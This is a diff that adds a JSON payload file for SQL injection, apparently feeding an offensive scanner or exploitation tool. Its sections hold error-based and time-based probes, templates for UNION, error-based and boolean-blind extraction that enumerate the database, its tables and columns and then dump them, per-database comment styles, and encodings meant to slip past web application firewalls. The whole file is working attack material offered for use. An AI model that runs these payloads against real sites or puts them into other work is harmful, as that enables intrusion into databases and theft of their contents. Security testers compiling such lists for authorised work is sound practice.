@@ -1,0 +1,57 @@
+{
+  "detection": {
+    "error_based": [
+      "'", "\"", "' OR 1=1--", "\" OR 1=1--", "' OR '1'='1", "' AND 1=1--",
+      "' AND 1=2--", "1' ORDER BY 1--", "1' ORDER BY 100--",
+      "') OR 1=1--", "\") OR 1=1--", "1 OR 1=1", "1' OR '1'='1'--",
+      "admin'--", "1' WAITFOR DELAY '0:0:5'--", "1' AND SLEEP(5)--",
+      "1; WAITFOR DELAY '0:0:5'--", "1 AND SLEEP(5)",
+      "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--"
+    ],
+    "time_based": [
+      "1' AND SLEEP(5)--", "1' AND SLEEP(5)#",
+      "1\" AND SLEEP(5)--", "1\" AND SLEEP(5)#",
+      "1') AND SLEEP(5)--", "1\") AND SLEEP(5)--",
+      "1; WAITFOR DELAY '0:0:5'--",
+      "1' AND BENCHMARK(5000000,SHA1('test'))--",
+      "1' AND (SELECT * FROM (SELECT SLEEP(5))a)--",
+      "1' OR SLEEP(5)--", "1' XOR SLEEP(5)--"
+    ]
+  },
+  "exploitation": {
+    "union_extract": {
+      "column_count": "' ORDER BY {n}--",
+      "union_null": "' UNION SELECT {nulls}--",
+      "db_name": "' UNION SELECT {pre}database(){post}--",
+      "tables": "' UNION SELECT {pre}group_concat(table_name){post} FROM information_schema.tables WHERE table_schema=database()--",
+      "columns": "' UNION SELECT {pre}group_concat(column_name){post} FROM information_schema.columns WHERE table_name='{table}'--",
+      "dump": "' UNION SELECT {pre}group_concat({col}){post} FROM {table}--"
+    },
+    "error_extract": [
+      "' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--",
+      "' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--",
+      "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+      "' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--"
+    ],
+    "boolean_blind": {
+      "ascii_check": "' AND ASCII(SUBSTRING(({query}),{pos},1))={char}--",
+      "binary_search_gt": "' AND ASCII(SUBSTRING(({query}),{pos},1))>{mid}--",
+      "binary_search_lt": "' AND ASCII(SUBSTRING(({query}),{pos},1))<{mid}--"
+    }
+  },
+  "comment_styles": {
+    "mysql": ["--", "#", "-- -", "/**/"],
+    "postgresql": ["--", "/**/"],
+    "mssql": ["--", "/**/"],
+    "sqlite": ["--", "/**/"],
+    "oracle": ["--", "/**/"]
+  },
+  "waf_bypass": [
+    "/*!50000UNION*/+/*!50000SELECT*/",
+    "UNION/**/SELECT", "UNION%09SELECT", "UNION%0ASELECT",
+    "uNiOn SeLeCt", "UNI%4FN SEL%45CT",
+    "'%20OR%20'1'%3D'1", "' OR 1=1/*", "' OR ''='",
+    "1'%20oR%20'1'%3D'1", "admin'/*", "') or ('1'='1",
+    "0x27 OR 1=1--", "' OR 1 LIKE 1--"
+  ]
+}
